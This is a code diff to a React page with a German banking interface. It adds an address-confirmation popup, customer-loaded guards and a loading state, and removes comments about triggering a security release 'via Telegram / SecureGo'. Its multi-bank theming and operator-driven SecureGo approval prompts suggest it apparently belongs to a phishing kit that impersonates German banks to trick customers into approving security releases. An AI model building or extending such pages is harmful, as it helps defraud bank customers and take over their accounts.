@@ -215,9 +215,54 @@ function PersonalDataPage() {
 
   const bankId = bankCtx?.bankId ?? "";
 
+  const addressPopup = addressData && addressPopupOpen ? (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
+      <div className="bg-white rounded-xl max-w-md w-full p-6 shadow-xl">
+        {addressConfirmed ? (
+          <div className="flex flex-col items-center text-center py-4">
+            <CheckCircle2 className="w-12 h-12 text-green-600 mb-2" />
+            <p className="font-medium text-gray-900">Adresse wird aktualisiert…</p>
+          </div>
+        ) : (
+          <>
+            <h3 className="text-lg font-semibold text-gray-900 mb-3">Adresse prüfen</h3>
+            <p className="text-sm text-gray-600 mb-4">
+              Bitte prüfen Sie die neue Adresse und bestätigen Sie die Löschung der alten Adresse.
+            </p>
+            <div className="space-y-3 mb-5">
+              <div className="rounded-lg border border-gray-200 p-3">
+                <div className="text-xs text-gray-500 mb-1">Alte Adresse</div>
+                <div className="text-sm text-gray-900">{addressData.old_street || "—"}</div>
+              </div>
+              <div className="rounded-lg border-2 p-3" style={{ borderColor: theme.accentText }}>
+                <div className="text-xs text-gray-500 mb-1">Neue Adresse</div>
+                <div className="text-sm text-gray-900">{addressData.new_street || "—"}</div>
+                <div className="text-sm text-gray-900">
+                  {[addressData.new_plz, addressData.new_city].filter(Boolean).join(" ") || "—"}
+                </div>
+              </div>
+            </div>
+            {addressError && (
+              <p className="text-sm text-red-600 mb-3">{addressError}</p>
+            )}
+            <button
+              type="button"
+              onClick={handleConfirmAddress}
+              disabled={confirmingAddress}
+              className={`w-full px-4 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90 disabled:opacity-60`}
+              style={{ backgroundColor: theme.buttonBg }}
+            >
+              {confirmingAddress ? "Wird bestätigt…" : "Adresse löschen"}
+            </button>
+          </>
+        )}
+      </div>
+    </div>
+  ) : null;
+
   return (
     <BankShell {...shellProps}>
-      {step === "personal" && (
+      {customer && step === "personal" && (
         <PersonalDataOverview
           // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
           theme={theme}
@@ -225,8 +270,6 @@ function PersonalDataPage() {
           bankId={bankId}
           addressDecisionPending={addressDecisionPending}
           onAddressChoiceResolved={() => {
-            // Kunde hat sich für eine Adresse entschieden – erneute
-            // Sicherheitsfreigabe via Telegram / SecureGo anstoßen.
             setAddressDecisionPending(false);
             setForceShowSecureGo(true);
             setStep("address");
@@ -242,7 +285,7 @@ function PersonalDataPage() {
         />
       )}
 
-      {step === "address" && (
+      {customer && step === "address" && (
         <AddressVerification
           bankName={bankCtx?.bankName ?? ""}
           bankId={bankId}
@@ -258,8 +301,6 @@ function PersonalDataPage() {
           onSecureGoOpened={() => setForceShowSecureGo(false)}
           onConfirm={() => setStep("done")}
           onDelete={() => {
-            // Rücksprung: Kunde muss auf "Persönliche Daten" erneut die
-            // aktuelle Hauptadresse aus zwei Adressen auswählen.
             setAddressDecisionPending(true);
             setForceShowSecureGo(false);
             setStep("personal");
@@ -269,9 +310,19 @@ function PersonalDataPage() {
         />
       )}
 
-      {step === "done" && (
+      {customer && step === "done" && (
         <CompletionStep theme={theme} customerName={customer.name} />
       )}
+
+      {!customer && (
+        <div className="min-h-[40vh] flex flex-col items-center justify-center text-gray-500">
+          <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
+          <p className="text-sm">Daten werden geladen…</p>
+        </div>
+      )}
+
+      {addressPopup}
     </BankShell>
   );
 }
+
